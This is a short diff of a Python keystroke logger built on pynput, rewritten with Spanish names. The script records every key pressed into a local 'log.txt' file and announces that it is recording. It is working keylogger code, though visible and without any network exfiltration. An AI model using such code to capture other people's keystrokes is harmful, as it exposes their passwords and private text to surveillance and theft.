@@ -1,21 +1,11 @@
 from pynput.keyboard import Listener
-from datetime import datetime
 
-def on_press(key):
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    
-    try:
-        char = key.char
-    except AttributeError:
-        char = f"[{key}]"
+def al_presionar(tecla):
+    with open("log.txt", "a") as archivo:
+        # Registra la tecla tal cual la recibe el sistema
+        archivo.write(f"{tecla} ")
 
-    log = f"{timestamp} - {char}"
-    print(log)
+print("Grabando teclas... (Presiona Ctrl+C para salir)")
 
-    with open("teclas.txt", "a", encoding="utf-8") as file:
-        file.write(log + "\n")
-
-print("Programa iniciado - capturador de teclas (modo educativo)")
-
-with Listener(on_press=on_press) as listener:
-    listener.join()
+with Listener(on_press=al_presionar) as l:
+    l.join()
